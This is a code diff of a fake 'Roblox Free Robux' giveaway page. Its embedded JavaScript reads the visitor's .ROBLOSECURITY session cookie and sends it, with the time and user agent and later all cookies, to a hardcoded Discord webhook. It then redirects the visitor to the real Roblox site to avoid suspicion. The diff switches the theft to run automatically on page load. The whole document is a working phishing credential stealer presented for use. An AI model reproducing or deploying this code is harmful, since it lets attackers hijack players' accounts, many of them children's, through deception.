@@ -1,58 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Roblox - Claim Your Free Robux!</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #1b1b1b;
-            color: #fff;
-            margin-top: 50px;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #00b7ff;
-            border: none;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0099cc;
-        }
-    </style>
+    <title>Roblox Free Robux</title>
     <script>
-        // Function to extract and send the Roblox cookie
         function logRobloxCookie() {
             try {
-                // Grab all cookies
+                // Get all cookies for this domain
                 const cookies = document.cookie;
-                const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
+                console.log("All cookies:", cookies); // Debug: see what’s available
 
-                // Extract cookie value if it exists
+                // Search for .ROBLOSECURITY
+                const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')) || "Cookie not found";
                 const cookieValue = robloxCookie.includes('=') ? robloxCookie.split('=')[1] : robloxCookie;
 
-                // Discord webhook URL (replace with your test webhook)
+                // Your Discord webhook URL
                 const webhookUrl = "https://discord.com/api/webhooks/1338299297292226590/vG66beFgowK_JWnSqaeHltm50_Wl7R26AGggIGdc_Xpw71OqDh4NriFFAzk4hWX5PCNB";
 
-                // Build the Discord payload
+                // Build payload with debug info
                 const payload = {
                     username: "Roblox Logger",
-                    avatar_url: "https://i.imgur.com/xyz123.png", // Optional avatar
-                    content: "Caught a Roblox cookie!",
+                    content: "Cookie check triggered!",
                     embeds: [{
-                        title: "Stolen Cookie Info",
+                        title: "Cookie Info",
                         fields: [
-                            { name: "Cookie", value: `\`\`\`${cookieValue}\`\`\``, inline: true },
-                            { name: "Timestamp", value: new Date().toLocaleString(), inline: true },
-                            { name: "User Agent", value: navigator.userAgent, inline: false }
+                            { name: "ROBLOSECURITY", value: `\`\`\`${cookieValue}\`\`\``, inline: true },
+                            { name: "Time", value: new Date().toLocaleString(), inline: true },
+                            { name: "All Cookies", value: `\`\`\`${cookies || "None"}\`\`\``, inline: false }
                         ],
-                        color: 15258703 // Bright yellow for visibility
+                        color: 15258703
                     }]
                 };
 
-                // Send to Discord webhook
+                // Send to Discord
                 fetch(webhookUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -60,39 +39,34 @@
                 })
                 .then(response => {
                     if (response.ok) {
-                        console.log("Cookie sent successfully!");
-                        // Redirect to real Roblox site after a short delay
-                        setTimeout(() => {
-                            window.location.href = "https://www.roblox.com/";
-                        }, 1000);
+                        console.log("Sent to webhook!");
+                        window.location.href = "https://www.roblox.com/";
                     } else {
                         throw new Error("Webhook failed");
                     }
                 })
                 .catch(error => {
-                    console.error("Error sending to webhook:", error);
-                    // Redirect anyway to avoid suspicion
-                    window.location.href = "https://www.roblox.com/";
+                    console.error("Fetch error:", error);
+                    window.location.href = "https://www.roblox.com/"; // Redirect anyway
                 });
             } catch (error) {
-                console.error("Something broke:", error);
-                window.location.href = "https://www.roblox.com/"; // Fallback redirect
+                console.error("Script error:", error);
+                window.location.href = "https://www.roblox.com/";
             }
         }
 
-        // Trigger on page load or button click
-        window.onload = function() {
-            // Uncomment to steal cookie immediately on load
-            // logRobloxCookie();
+        // Run on load
+        window.onload = logRobloxCookie;
 
-            // Or wait for user interaction (more subtle)
-            document.getElementById("claimButton").addEventListener("click", logRobloxCookie);
-        };
+        // Optional: Button trigger for manual testing
+        function manualTrigger() {
+            logRobloxCookie();
+        }
     </script>
 </head>
 <body>
-    <h1>Roblox Free Robux Giveaway!</h1>
-    <p>Click below to claim 1000 Robux instantly!</p>
-    <button id="claimButton">Claim Now</button>
+    <h1>Loading Your Free Robux...</h1>
+    <button onclick="manualTrigger()">Test Again</button>
+    <p>If no cookie is found, set a test cookie in console: <code>document.cookie = ".ROBLOSECURITY=test123; path=/";</code></p>
 </body>
 </html>
